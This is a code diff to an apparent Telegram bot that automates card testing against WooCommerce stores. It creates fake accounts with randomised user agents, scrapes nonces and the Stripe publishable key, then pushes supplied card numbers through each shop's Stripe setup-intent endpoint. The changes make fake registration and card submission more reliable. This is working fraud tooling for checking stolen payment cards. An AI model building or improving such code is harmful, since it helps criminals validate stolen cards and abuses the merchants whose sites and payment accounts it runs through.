@@ -5,7 +5,8 @@ import string
 import re
 import html
 import time
-from fake_useragent import UserAgent
+from user_agents import get_random_user_agent
+from woo_helpers import build_registration_payload, is_logged_in
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import Application, CommandHandler, ContextTypes
@@ -66,30 +67,77 @@ def analyze_site_page(text: str) -> dict:
     }
 def register_new_account(register_url: str, session: requests.Session = None):
     """
-    Registers a random account on the WooCommerce site.
-    Returns a requests.Session with cookies if successful, or None if failed.
+    Register a random account on the WooCommerce site.
+    Grabs dynamic form fields/nonce to avoid false negatives.
+    Returns a session seeded with cookies when successful.
     """
     sess = session or requests.Session()
+    user_agent = get_random_user_agent()
     headers = {
-        "User-Agent": UserAgent().random,
+        "User-Agent": user_agent,
         "Referer": register_url,
-        "Content-Type": "application/x-www-form-urlencoded"
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     }
 
-    data = {
-        "email": generate_random_email(),
-        "username": generate_random_username(),
-        "password": generate_random_string(12)
-    }
+    email = generate_random_email()
+    username = generate_random_username()
+    password = generate_random_string(12)
+    first_name = generate_random_string(6).title()
+    last_name = generate_random_string(6).title()
 
     try:
-        resp = sess.post(register_url, headers=headers, data=data, timeout=15, allow_redirects=True)
-        if resp.status_code in (200, 302):
-            logger.info(f"[+] Registered new account: {data['email']} | {data['username']}")
-            return sess
-        else:
-            logger.warning(f"[!] Registration failed ({resp.status_code}): {resp.text[:300]}")
+        resp = sess.get(register_url, headers=headers, timeout=15)
+    except Exception as e:
+        logger.error(f"Registration page fetch failed: {e}")
+        return None
+
+    html_text = resp.text or ""
+    payload = build_registration_payload(
+        html_text,
+        email=email,
+        username=username,
+        password=password,
+        first_name=first_name,
+        last_name=last_name,
+    )
+
+    if not payload:
+        logger.warning("[register_new_account] Unable to build registration payload (no fields detected)")
+        return None
+
+    try:
+        post_resp = sess.post(
+            register_url,
+            headers=headers,
+            data=payload,
+            timeout=20,
+            allow_redirects=True,
+        )
+        if post_resp.status_code not in (200, 302):
+            logger.warning(f"Registration failed ({post_resp.status_code}): {post_resp.text[:300]}")
             return None
+
+        html_after = post_resp.text or ""
+        if not html_after or not is_logged_in(html_after):
+            # Some themes redirect quietly—double check by loading account page.
+            try:
+                verify = sess.get(register_url, headers=headers, timeout=10)
+                if not is_logged_in(verify.text or ""):
+                    logger.warning("[register_new_account] Registration response does not indicate login")
+                    return None
+            except Exception:
+                logger.warning("[register_new_account] Verification request failed")
+                return None
+
+        logger.info(f"[+] Registered new account: {email} | {username}")
+        sess._account_credentials = {
+            "email": email,
+            "username": username,
+            "password": password,
+        }
+        sess.headers.update({"User-Agent": user_agent})
+        return sess
     except Exception as e:
         logger.error(f"Exception during registration: {e}")
         return None
@@ -103,7 +151,7 @@ def find_pk(payment_url: str, session: requests.Session = None) -> str | None:
     """
     sess = session or requests.Session()
     try:
-        headers = {"User-Agent": UserAgent().random}
+        headers = {"User-Agent": get_random_user_agent()}
         resp = sess.get(payment_url, headers=headers, timeout=15)
         text = resp.text
     except Exception as e:
@@ -255,7 +303,7 @@ def send_card_to_stripe(session: requests.Session, pk: str, card: str):
     if yy.startswith("20"):
         yy = yy[2:]
 
-    headers = {"User-Agent": UserAgent().random, "Referer": ""}  # referer set later when known
+    headers = {"User-Agent": get_random_user_agent(), "Referer": ""}  # referer set later when known
 
     # 1) Create payment method on Stripe
     stripe_payload = {
@@ -283,7 +331,11 @@ def send_card_to_stripe(session: requests.Session, pk: str, card: str):
     # 2) Get nonce from payment page (must fetch full payment_url page so referer and cookies align)
     logger.debug("[DEBUG] Retrieving nonce from payment page HTML")
     try:
-        html_text = session.get(session.payment_page_url, headers={"User-Agent": UserAgent().random}, timeout=15).text
+        html_text = session.get(
+            session.payment_page_url,
+            headers={"User-Agent": get_random_user_agent()},
+            timeout=15,
+        ).text
     except Exception as e:
         return {"error": "Failed to fetch payment page for nonce", "raw": str(e)}
 
@@ -306,9 +358,17 @@ def send_card_to_stripe(session: requests.Session, pk: str, card: str):
         '_ajax_nonce': nonce,
     }
 
-    payment_intent_url = session.payment_page_url.replace('/add-payment-method/', '/?wc-ajax=wc_stripe_create_and_confirm_setup_intent')
+    payment_intent_url = session.payment_page_url.replace(
+        '/add-payment-method/',
+        '/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
+    )
     logger.debug(f"[DEBUG] Sending final request to {payment_intent_url}")
-    final_resp = session.post(payment_intent_url, headers={"User-Agent": UserAgent().random, "Referer": session.payment_page_url}, data=data_final, timeout=25)
+    final_resp = session.post(
+        payment_intent_url,
+        headers={"User-Agent": get_random_user_agent(), "Referer": session.payment_page_url},
+        data=data_final,
+        timeout=25,
+    )
 
     try:
         final_json = final_resp.json()
@@ -349,7 +409,7 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         # Step 1: Check if site reachable
         start_time = time.time()
-        r = requests.get(base, headers={"User-Agent": UserAgent().random}, timeout=15)
+        r = requests.get(base, headers={"User-Agent": get_random_user_agent()}, timeout=15)
         response_time = time.time() - start_time
         if r.status_code >= 400:
             await progress_msg.edit_text(f"❌ Failed fetching {html_escape(base)} (status {r.status_code})", parse_mode=ParseMode.HTML)
@@ -366,7 +426,11 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Step 3: Fetch payment page
         await progress_msg.edit_text(" Payment gateways...", parse_mode=ParseMode.HTML)
-        page_html = session.get(session.payment_page_url, headers={"User-Agent": UserAgent().random}, timeout=15).text
+        page_html = session.get(
+            session.payment_page_url,
+            headers={"User-Agent": get_random_user_agent()},
+            timeout=15,
+        ).text
         page_info = analyze_site_page(page_html)
 
         # Step 4: Find PK
